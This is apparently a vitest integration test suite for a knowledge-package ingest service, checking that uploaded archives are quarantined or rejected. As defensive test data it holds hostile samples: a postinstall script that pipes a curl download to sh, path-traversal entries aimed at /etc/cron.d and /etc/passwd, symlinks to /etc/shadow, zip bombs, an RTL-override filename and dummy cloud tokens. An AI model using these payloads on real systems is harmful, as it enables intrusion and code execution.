import { createHash } from 'node:crypto';
import { mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { uuidv7 } from '@nuzm/platform';
import { ORG_A, createEnv, type TestEnv } from '@nuzm/platform/testing';
import { FsObjectStore, type KnowledgeObjectStore } from '@nuzm/adapter-knowledge-store';
import { knowledgeArchiveTesting } from '@nuzm/domain';
import { KnowledgeIngestService, type IngestServiceOptions } from './ingest-service';

/**
 * S-K2a, end to end on a real PostgreSQL under the real `nuzm_worker` role: packages (clean and hostile) go through VALIDATE -> EXTRACT, and every rule of the
 * pipeline is checked where it matters: the resulting state, the evidence rows, the object store and the isolation of tenants. Nothing from a package is executed.
 */
const { buildTar, buildZip, tarGz } = knowledgeArchiveTesting;
let env: TestEnv;
let dir: string;
let store: FsObjectStore;
const UPLOADER = '00000000-0000-7000-8000-0000000000f1';
const MIT =
  'MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software';
const f = (name: string, data: string | Buffer, extra: object = {}) => ({
  name,
  data: Buffer.isBuffer(data) ? data : Buffer.from(data),
  ...extra,
});

beforeAll(async () => {
  env = await createEnv();
  dir = mkdtempSync(join(tmpdir(), 'nuzm-ingest-'));
  store = new FsObjectStore(dir);
});
afterAll(async () => {
  await env.close();
  rmSync(dir, { recursive: true, force: true });
});

const service = (opts: IngestServiceOptions = {}, s: KnowledgeObjectStore = store) =>
  new KnowledgeIngestService(env.worker, s, { heartbeatMs: 50, ...opts });

/** Stores `bytes` as a content-addressed archive and creates a resource + QUARANTINED version + VALIDATE job, as upload completion does. */
async function submit(
  bytes: Buffer,
  opts: { org?: string | null; tamper?: boolean; missing?: boolean; checksum?: string } = {},
) {
  const sha = opts.checksum ?? createHash('sha256').update(bytes).digest('hex');
  const key = `archives/${sha}`;
  if (!opts.missing)
    await store.put(key, opts.tamper ? Buffer.concat([bytes, Buffer.from('x')]) : bytes, {
      ifAbsent: true,
    });
  const rid = uuidv7();
  const vid = uuidv7();
  const jid = uuidv7();
  const org = opts.org ?? null;
  await env.sql(
    `INSERT INTO knowledge.resources (id, org_id, slug, name, resource_type, platform, visibility, source_kind, status, data_region, current_version_id)
     VALUES ($1,$2,$3,$3,'THEME','WEB',$4,'upload','QUARANTINED','sa-central',NULL)`,
    [rid, org, `r-${rid.slice(-8)}`, org ? 'TENANT_PRIVATE' : 'PLATFORM_PRIVATE'],
  );
  await env.sql(
    `INSERT INTO knowledge.resource_versions (id, resource_id, org_id, seq, state, checksum_sha256, bytes, archive_key, created_by) VALUES ($1,$2,$3,1,'QUARANTINED',$4,$5,$6,$7)`,
    [vid, rid, org, sha, bytes.length, key, UPLOADER],
  );
  await env.sql(`UPDATE knowledge.resources SET current_version_id = $2 WHERE id = $1`, [rid, vid]);
  await env.sql(
    `INSERT INTO knowledge.processing_jobs (id, version_id, org_id, kind) VALUES ($1,$2,$3,'VALIDATE')`,
    [jid, vid, org],
  );
  return { rid, vid, jid, key };
}
const ver = async (vid: string) =>
  (
    await env.sql(
      `SELECT state, state_reason, analysis_job_id, license_proposal, ingest_summary FROM knowledge.resource_versions WHERE id = $1`,
      [vid],
    )
  )[0]!;
const resStatus = async (rid: string) =>
  (await env.sql(`SELECT status FROM knowledge.resources WHERE id = $1`, [rid]))[0]!.status;
const jobs = async (vid: string) =>
  env.sql(
    `SELECT kind, state, attempt, error_code, error_detail FROM knowledge.processing_jobs WHERE version_id = $1 ORDER BY created_at, kind`,
    [vid],
  );
const logs = async (vid: string) =>
  env.sql(
    `SELECT level, stage, code, message, data FROM knowledge.processing_logs WHERE version_id = $1 ORDER BY seq`,
    [vid],
  );
const findings = async (vid: string) =>
  env.sql(
    `SELECT scanner, code, severity, path, line, detail FROM knowledge.scan_findings WHERE version_id = $1`,
    [vid],
  );
const files = async (vid: string) =>
  env.sql(
    `SELECT path, sha256, bytes::int AS bytes, language, is_binary, is_executable, object_key, secret_findings FROM knowledge.resource_files WHERE version_id = $1 ORDER BY path`,
    [vid],
  );
const allStoreFiles = (): string[] => {
  const out: string[] = [];
  const walk = (d: string) => {
    for (const n of readdirSync(d)) {
      const p = join(d, n);
      if (statSync(p).isDirectory()) walk(p);
      else out.push(p);
    }
  };
  walk(dir);
  return out;
};

describe('a clean package', () => {
  it('goes QUARANTINED -> VALIDATING -> ANALYZING -> AWAITING_REVIEW with complete evidence', async () => {
    const zip = buildZip([
      f('LICENSE', MIT),
      f(
        'package.json',
        JSON.stringify({
          name: 'theme',
          license: 'MIT',
          dependencies: { next: '^15.0.0', react: '^19' },
          devDependencies: { typescript: '^5' },
        }),
      ),
      f('src/app/page.tsx', 'export default function Page() { return <main>hi</main>; }\n'),
      f(
        'public/logo.png',
        Buffer.concat([
          Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
          Buffer.alloc(40, 3),
        ]),
        { method: 0 },
      ),
      f('node_modules/left-pad/index.js', 'module.exports = 1'),
    ]);
    const s = await submit(zip);
    expect(await service().drain()).toBe(2);
    expect(await ver(s.vid)).toMatchObject({ state: 'AWAITING_REVIEW', state_reason: null });
    expect(await resStatus(s.rid)).toBe('AWAITING_REVIEW');
    expect((await jobs(s.vid)).map((j) => `${j.kind}:${j.state}`)).toEqual([
      'VALIDATE:SUCCEEDED',
      'EXTRACT:SUCCEEDED',
    ]);
    const v = await ver(s.vid);
    expect(v.analysis_job_id).toBeTruthy();
    expect(v.license_proposal).toMatchObject({ spdx: 'MIT', verdict: 'ALLOWED' });
    expect(v.ingest_summary).toMatchObject({
      format: 'zip',
      files: 4,
      blocked: false,
      dependencies: 3,
    });
    const fs = await files(s.vid);
    expect(fs.map((x) => x.path)).toEqual([
      'LICENSE',
      'package.json',
      'public/logo.png',
      'src/app/page.tsx',
    ]);
    expect(fs.every((x) => x.object_key === `snapshots/${x.sha256}`)).toBe(true);
    expect(
      (
        await env.sql(
          `SELECT name, kind FROM knowledge.resource_dependencies WHERE version_id = $1 ORDER BY name`,
          [s.vid],
        )
      ).map((d) => `${d.name}:${d.kind}`),
    ).toEqual(['next:runtime', 'react:runtime', 'typescript:dev']);
    expect((await findings(s.vid)).filter((x) => x.severity === 'block')).toEqual([]);
    const l = await logs(s.vid);
    expect(l.map((x) => x.code)).toEqual(
      expect.arrayContaining(['job.started', 'validate.ok', 'extract.begin', 'extract.done']),
    );
    expect(l.every((x) => x.level !== 'error')).toBe(true);
    // the stored snapshot is byte-identical to what was uploaded, and the original archive is untouched
    expect(readFileSync(join(dir, fs[3]!.object_key as string)).toString()).toContain(
      '<main>hi</main>',
    );
    expect(
      createHash('sha256')
        .update(readFileSync(join(dir, s.key)))
        .digest('hex'),
    ).toBe(s.key.slice('archives/'.length));
  });
  it('processes a tar.gz the same way', async () => {
    const s = await submit(tarGz(buildTar([f('LICENSE', MIT), f('index.js', 'console.log(1)\n')])));
    await service().drain();
    expect(await ver(s.vid)).toMatchObject({ state: 'AWAITING_REVIEW' });
    expect((await ver(s.vid)).ingest_summary).toMatchObject({ format: 'tar.gz' });
  });
  it('a package without a licence reaches review with an UNKNOWN proposal (it can never be activated)', async () => {
    const s = await submit(buildZip([f('index.js', 'let a = 1;\n')]));
    await service().drain();
    expect(await ver(s.vid)).toMatchObject({
      state: 'AWAITING_REVIEW',
      license_proposal: expect.objectContaining({ verdict: 'UNKNOWN' }),
    });
    expect((await findings(s.vid)).some((x) => x.code === 'license_unknown')).toBe(true);
  });
});

describe('a package with a blocking finding stays quarantined', () => {
  it('quarantines on a secret, keeps the secret out of storage, logs and findings', async () => {
    const key = 'AKIA' + 'QWERTYUIOPASDFGH';
    const s = await submit(
      buildZip([
        f('LICENSE', MIT),
        f('src/config.ts', `export const k = "${key}";\n`),
        f('.env', 'TOKEN=abc'),
      ]),
    );
    await service().drain();
    expect(await ver(s.vid)).toMatchObject({ state: 'QUARANTINED', state_reason: 'secrets_found' });
    expect(await resStatus(s.rid)).toBe('QUARANTINED');
    const fx = await findings(s.vid);
    expect(fx).toContainEqual(
      expect.objectContaining({
        scanner: 'secrets',
        code: 'secret_found',
        severity: 'block',
        path: 'src/config.ts',
        line: 1,
      }),
    );
    expect(fx).toContainEqual(expect.objectContaining({ code: 'sensitive_file', path: '.env' }));
    const fs = await files(s.vid);
    expect(fs.find((x) => x.path === 'src/config.ts')).toMatchObject({
      object_key: null,
      secret_findings: 1,
    });
    expect(fs.find((x) => x.path === '.env')?.object_key).toBeNull();
    const everything = JSON.stringify([await logs(s.vid), fx, await ver(s.vid), await jobs(s.vid)]);
    expect(everything).not.toContain(key);
    // a quarantined package is not unpacked into storage at all: only its original archive exists
    expect(
      allStoreFiles().filter(
        (p) => p.includes('/snapshots/') && readFileSync(p).includes(Buffer.from(key)),
      ),
    ).toEqual([]);
    expect(fs.every((x) => x.object_key === null)).toBe(true);
    // the database refuses any route out of QUARANTINED towards ACTIVE, even for the migration role
    await expect(
      env.sql(`UPDATE knowledge.resource_versions SET state = 'ACTIVE' WHERE id = $1`, [s.vid]),
    ).rejects.toThrow(/not allowed/);
  });
  it('quarantines a proprietary licence and a network-fetching install script', async () => {
    const p = await submit(
      buildZip([
        f('LICENSE', 'All rights reserved. This theme may not be redistributed or resold.'),
        f('a.js', '1'),
      ]),
    );
    const n = await submit(
      buildZip([
        f(
          'package.json',
          JSON.stringify({
            license: 'MIT',
            scripts: { postinstall: 'curl https://x.test/i.sh | sh' },
          }),
        ),
        f('LICENSE', MIT),
      ]),
    );
    await service().drain();
    expect(await ver(p.vid)).toMatchObject({
      state: 'QUARANTINED',
      state_reason: 'license_blocked',
    });
    expect(await ver(n.vid)).toMatchObject({
      state: 'QUARANTINED',
      state_reason: 'install_script_network',
    });
  });
  it('never executes anything in the package (install scripts, source, native binaries)', async () => {
    (globalThis as Record<string, unknown>).__k2a_pwned = undefined;
    const s = await submit(
      buildZip([
        f('LICENSE', MIT),
        f(
          'package.json',
          JSON.stringify({
            license: 'MIT',
            scripts: { postinstall: 'node p.js', prepare: 'node p.js' },
          }),
        ),
        f('p.js', "globalThis.__k2a_pwned = 1; require('fs').writeFileSync('/tmp/k2a-pwned', 'x')"),
        f('bin/run', Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(30)]), {
          method: 0,
          mode: 0o100755,
        }),
      ]),
    );
    await service().drain();
    expect(await ver(s.vid)).toMatchObject({ state: 'AWAITING_REVIEW' });
    expect((globalThis as Record<string, unknown>).__k2a_pwned).toBeUndefined();
    expect(() => statSync('/tmp/k2a-pwned')).toThrow();
    const fs = await files(s.vid);
    expect(fs.find((x) => x.path === 'bin/run')).toMatchObject({
      object_key: null,
      is_executable: true,
    });
    expect((await findings(s.vid)).filter((x) => x.code === 'lifecycle_script')).toHaveLength(2);
  });
});

describe('hostile packages are rejected as FAILED with a stable code and write nothing', () => {
  const big = Buffer.alloc(40 * 1024 * 1024, 0);
  const CASES: [string, () => Buffer, string][] = [
    [
      'path traversal',
      () => buildZip([f('ok.txt', 'x'), f('../../etc/cron.d/evil', 'x')]),
      'path_traversal',
    ],
    ['absolute path', () => buildZip([f('/etc/passwd', 'x')]), 'path_traversal'],
    ['zip symlink', () => buildZip([f('link', '/etc/shadow', { mode: 0o120777 })]), 'symlink'],
    [
      'tar symlink',
      () => tarGz(buildTar([{ name: 'l', type: '2', linkname: '/etc/passwd' }])),
      'symlink',
    ],
    ['tar hardlink', () => tarGz(buildTar([{ name: 'h', type: '1', linkname: 'a' }])), 'hardlink'],
    ['zip bomb', () => buildZip([f('zeros.bin', big)]), 'ratio_exceeded'],
    ['tar.gz bomb', () => tarGz(buildTar([{ name: 'zeros', data: big }])), 'ratio_exceeded'],
    ['lying size', () => buildZip([f('a', 'hello', { declaredUsize: 999 })]), 'size_mismatch'],
    ['bad crc', () => buildZip([f('a', 'hello', { crc: 7 })]), 'crc_mismatch'],
    ['encrypted entry', () => buildZip([f('a', 'x', { flags: 1 })]), 'encrypted'],
    [
      'case collision',
      () => buildZip([f('README.md', 'a'), f('readme.md', 'b')]),
      'path_collision',
    ],
    [
      'overlapping entries',
      () => buildZip([f('a.txt', 'hello world'), f('b.txt', 'hello world', { lho: 0 })]),
      'overlap',
    ],
    ['RTL-override name', () => buildZip([f('a‮gnp.exe', 'x')]), 'path_invalid'],
    [
      'not an archive',
      () => Buffer.from('MZ\x90\x00 this is a Windows executable, not an archive'),
      'unsupported_format',
    ],
  ];
  it.each(CASES)('%s -> %s', async (_name, make, code) => {
    const before = allStoreFiles().length;
    const s = await submit(make());
    await service().drain();
    const v = await ver(s.vid);
    expect(v, _name).toMatchObject({ state: 'FAILED', state_reason: code });
    expect(await resStatus(s.rid)).toBe('FAILED');
    expect(await files(s.vid)).toEqual([]);
    expect(v.analysis_job_id).toBeNull();
    const j = await jobs(s.vid);
    expect(j.find((x) => x.state === 'FAILED')).toMatchObject({ error_code: code });
    expect((await findings(s.vid)).find((x) => x.scanner === 'archive')).toMatchObject({
      code,
      severity: 'block',
    });
    expect(
      (await logs(s.vid)).some((x) => x.level === 'error' && x.code === `rejected.${code}`),
    ).toBe(true);
    // only the uploaded archive itself was added to the store; nothing was unpacked
    expect(allStoreFiles().length).toBeLessThanOrEqual(before + 1);
  });
});

describe('archive integrity at rest', () => {
  it('fails a stored archive that no longer matches its SHA-256, or that has disappeared', async () => {
    const t = await submit(buildZip([f('a.txt', 'x')]), { tamper: true, checksum: 'c'.repeat(64) });
    // the recorded size differs from the object: reported as a size mismatch before hashing
    await service().drain();
    expect(await ver(t.vid)).toMatchObject({ state: 'FAILED' });
    const m = await submit(buildZip([f('b.txt', 'y')]), {
      missing: true,
      checksum: 'd'.repeat(64),
    });
    await service().drain();
    expect(await ver(m.vid)).toMatchObject({ state: 'FAILED', state_reason: 'archive_missing' });
  });
  it('a same-size corruption is caught by the checksum', async () => {
    const bytes = buildZip([f('a.txt', 'hello')]);
    const s = await submit(bytes);
    const p = join(dir, s.key);
    const { chmodSync, writeFileSync } = await import('node:fs');
    chmodSync(p, 0o600);
    const bad = Buffer.from(bytes);
    bad[bad.length - 30] = bad[bad.length - 30]! ^ 0xff;
    writeFileSync(p, bad);
    await service().drain();
    expect(await ver(s.vid)).toMatchObject({ state: 'FAILED', state_reason: 'crc_mismatch' });
  });
});

describe('queue behaviour', () => {
  it('never claims a customer-owned job, whatever it says', async () => {
    const s = await submit(buildZip([f('LICENSE', MIT)]), { org: ORG_A });
    expect(await service().drain()).toBe(0);
    expect((await jobs(s.vid))[0]).toMatchObject({ state: 'QUEUED', attempt: 0 });
    expect(await ver(s.vid)).toMatchObject({ state: 'QUARANTINED' });
  });
  it('two workers draining one queue process every job exactly once', async () => {
    const subs = [];
    for (let i = 0; i < 6; i++)
      subs.push(await submit(buildZip([f('LICENSE', MIT), f('n.txt', `n${i}${Math.random()}`)])));
    const [a, b] = await Promise.all([
      service({ workerId: 'wA' }).drain(),
      service({ workerId: 'wB' }).drain(),
    ]);
    expect(a + b).toBeGreaterThanOrEqual(12);
    for (const s of subs) {
      expect(await ver(s.vid)).toMatchObject({ state: 'AWAITING_REVIEW' });
      expect((await jobs(s.vid)).map((j) => `${j.kind}:${j.state}:${j.attempt}`)).toEqual([
        'VALIDATE:SUCCEEDED:1',
        'EXTRACT:SUCCEEDED:1',
      ]);
      expect(await files(s.vid)).toHaveLength(2);
    }
  });
  it('a duplicate VALIDATE never creates a second EXTRACT', async () => {
    const s = await submit(buildZip([f('LICENSE', MIT)]));
    await service().runOnce();
    expect((await jobs(s.vid)).filter((j) => j.kind === 'EXTRACT')).toHaveLength(1);
    await expect(
      env.sql(
        `INSERT INTO knowledge.processing_jobs (id, version_id, org_id, kind) VALUES ($1,$2,NULL,'EXTRACT')`,
        [uuidv7(), s.vid],
      ),
    ).rejects.toThrow(/duplicate|unique/);
  });
  it('skips the jobs of an archived or disabled resource and never changes its status back', async () => {
    const a = await submit(buildZip([f('LICENSE', MIT)]));
    await env.sql(
      `UPDATE knowledge.resources SET status = 'ARCHIVED', deleted_at = now() WHERE id = $1`,
      [a.rid],
    );
    const d = await submit(buildZip([f('LICENSE', MIT), f('x.txt', 'disabled')]));
    await env.sql(`UPDATE knowledge.resources SET status = 'DISABLED' WHERE id = $1`, [d.rid]);
    await service().drain();
    for (const s of [a, d]) {
      expect((await jobs(s.vid))[0]).toMatchObject({ state: 'CANCELLED', error_code: 'cancelled' });
      expect(await ver(s.vid)).toMatchObject({ state: 'QUARANTINED' });
      expect(await files(s.vid)).toEqual([]);
    }
    expect(await resStatus(a.rid)).toBe('ARCHIVED');
    expect(await resStatus(d.rid)).toBe('DISABLED');
  });
  it('a job cancelled before it starts is CANCELLED and the version returns to QUARANTINED', async () => {
    const s = await submit(buildZip([f('LICENSE', MIT)]));
    await env.sql(`UPDATE knowledge.processing_jobs SET cancel_requested = true WHERE id = $1`, [
      s.jid,
    ]);
    await service().drain();
    expect((await jobs(s.vid))[0]).toMatchObject({ state: 'CANCELLED', error_code: 'cancelled' });
    expect(await ver(s.vid)).toMatchObject({ state: 'QUARANTINED', state_reason: 'cancelled' });
    expect(await files(s.vid)).toEqual([]);
  });
  it('a cancellation that arrives while the job runs stops it and records nothing', async () => {
    const entries = Array.from({ length: 40 }, (_, i) => f(`f${i}.txt`, `file ${i}`));
    const s = await submit(buildZip([f('LICENSE', MIT), ...entries]));
    await service().runOnce(); // VALIDATE
    // slow the store down so the heartbeat (50 ms) notices the flag mid-extraction
    class Slow extends FsObjectStore {
      override async readRange(k: string, o: number, l: number) {
        await new Promise((r) => setTimeout(r, 25));
        return super.readRange(k, o, l);
      }
    }
    const slow = new Slow(dir);
    const running = service({}, slow).runOnce();
    setTimeout(
      () =>
        void env.sql(
          `UPDATE knowledge.processing_jobs SET cancel_requested = true WHERE version_id = $1 AND kind = 'EXTRACT'`,
          [s.vid],
        ),
      150,
    );
    await running;
    const j = (await jobs(s.vid)).find((x) => x.kind === 'EXTRACT');
    expect(j).toMatchObject({ state: 'CANCELLED' });
    expect(await ver(s.vid)).toMatchObject({ state: 'QUARANTINED', state_reason: 'cancelled' });
    expect(await files(s.vid)).toEqual([]);
    expect(await findings(s.vid)).toEqual([]);
  });
  it('requeues a job whose lease expired, and dead-letters it after the last attempt', async () => {
    const s = await submit(buildZip([f('LICENSE', MIT)]));
    // simulate a worker that died while running attempt 1 of 3
    await env.sql(
      `UPDATE knowledge.processing_jobs SET state='RUNNING', attempt=1, lease_owner='dead', lease_expires_at = now() - interval '1 minute' WHERE id = $1`,
      [s.jid],
    );
    await env.sql(`UPDATE knowledge.resource_versions SET state='VALIDATING' WHERE id = $1`, [
      s.vid,
    ]);
    await service().drain();
    expect(await ver(s.vid)).toMatchObject({ state: 'AWAITING_REVIEW' });
    expect((await jobs(s.vid)).find((j) => j.kind === 'VALIDATE')).toMatchObject({
      state: 'SUCCEEDED',
      attempt: 2,
    });
    const d = await submit(buildZip([f('LICENSE', MIT)]));
    await env.sql(
      `UPDATE knowledge.processing_jobs SET state='RUNNING', attempt=3, lease_owner='dead', lease_expires_at = now() - interval '1 minute' WHERE id = $1`,
      [d.jid],
    );
    await env.sql(`UPDATE knowledge.resource_versions SET state='VALIDATING' WHERE id = $1`, [
      d.vid,
    ]);
    await service().drain();
    expect(await ver(d.vid)).toMatchObject({ state: 'FAILED', state_reason: 'processing_failed' });
    expect((await jobs(d.vid))[0]).toMatchObject({
      state: 'DEAD_LETTER',
      error_code: 'lease_expired',
    });
  });
  it('retries a transient infrastructure error with back-off, then succeeds; the raw error is never stored', async () => {
    class Flaky extends FsObjectStore {
      fails = 1;
      override async size(k: string) {
        if (this.fails-- > 0)
          throw new Error('connect ECONNREFUSED postgres://user:hunter2@10.0.0.5/db');
        return super.size(k);
      }
    }
    const flaky = new Flaky(dir);
    const s = await submit(buildZip([f('LICENSE', MIT)]));
    expect(await service({}, flaky).runOnce()).toBe(true);
    let j = (await jobs(s.vid))[0]!;
    expect(j).toMatchObject({ state: 'QUEUED', attempt: 1, error_code: 'transient_error' });
    expect(JSON.stringify([j, await logs(s.vid)])).not.toContain('hunter2');
    expect(await service({}, flaky).runOnce()).toBe(false); // not due yet: back-off
    await env.sql(`UPDATE knowledge.processing_jobs SET run_after = now() WHERE id = $1`, [s.jid]);
    await service({}, flaky).drain();
    j = (await jobs(s.vid))[0]!;
    expect(j).toMatchObject({ state: 'SUCCEEDED', attempt: 2 });
    expect(await ver(s.vid)).toMatchObject({ state: 'AWAITING_REVIEW' });
  });
  it('dead-letters a job that keeps failing and marks the version FAILED', async () => {
    class Down extends FsObjectStore {
      override async size(): Promise<number | null> {
        throw new Error('store down');
      }
    }
    const s = await submit(buildZip([f('LICENSE', MIT)]));
    for (let i = 0; i < 3; i++) {
      await env.sql(
        `UPDATE knowledge.processing_jobs SET run_after = now() WHERE id = $1 AND state = 'QUEUED'`,
        [s.jid],
      );
      await service({}, new Down(dir)).runOnce();
    }
    expect((await jobs(s.vid))[0]).toMatchObject({
      state: 'DEAD_LETTER',
      attempt: 3,
      error_code: 'processing_failed',
    });
    expect(await ver(s.vid)).toMatchObject({ state: 'FAILED', state_reason: 'processing_failed' });
    expect((await logs(s.vid)).some((x) => x.code === 'job.dead_letter')).toBe(true);
  });
});

describe('evidence and isolation of the pipeline', () => {
  it('the worker role cannot touch a customer version even when it knows its id, and processing leaves customer rows alone', async () => {
    const t = await submit(buildZip([f('LICENSE', MIT)]), { org: ORG_A });
    const rows = await env.worker.withKnowledgeWorker(
      async (c) =>
        (await c.query(`SELECT id FROM knowledge.resource_versions WHERE id = $1`, [t.vid]))
          .rowCount,
    );
    expect(rows).toBe(0);
    await service().drain();
    expect(
      (
        await env.sql(
          `SELECT count(*)::int n FROM knowledge.processing_logs WHERE version_id = $1`,
          [t.vid],
        )
      )[0]!.n,
    ).toBe(0);
  });
  it('every log row is short, structured and free of file content', async () => {
    const secret = 'ghp_' + 'Q'.repeat(36);
    const s = await submit(buildZip([f('LICENSE', MIT), f('x.ts', `const t = "${secret}";`)]));
    await service().drain();
    for (const l of await logs(s.vid)) {
      expect(String(l.message).length).toBeLessThanOrEqual(500);
      expect(JSON.stringify(l)).not.toContain(secret);
    }
  });
});
